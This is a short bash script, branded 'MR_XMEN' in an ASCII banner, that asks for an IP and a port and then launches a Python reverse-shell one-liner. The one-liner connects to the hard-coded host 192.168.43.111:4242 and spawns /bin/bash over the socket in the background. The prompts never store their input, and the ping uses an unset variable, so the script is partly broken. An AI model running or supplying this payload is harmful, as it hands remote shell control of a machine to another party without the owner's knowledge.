echo "                                                                                  "
echo "  ███╗   ███╗██████╗         ██╗  ██╗███╗   ███╗███████╗███╗   ██╗                "
echo "  ████╗ ████║██╔══██╗        ╚██╗██╔╝████╗ ████║██╔════╝████╗  ██║                "
echo "  ██╔████╔██║██████╔╝         ╚███╔╝ ██╔████╔██║█████╗  ██╔██╗ ██║                "
echo "  ██║╚██╔╝██║██╔══██╗         ██╔██╗ ██║╚██╔╝██║██╔══╝  ██║╚██╗██║                "
echo "  ██║ ╚═╝ ██║██║  ██║███████╗██╔╝ ██╗██║ ╚═╝ ██║███████╗██║ ╚████║                "
echo "  ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝                "
echo "                                                                                  "

echo ""
sleep 2s

read -p  "[1*]  Enter Your IP :"
echo ""
read -p "[2*]  Enter Your Port:"
echo ""
ping -c 3 $ip
sleep 2s
echo ""
sleep 2s

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.43.111",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' &
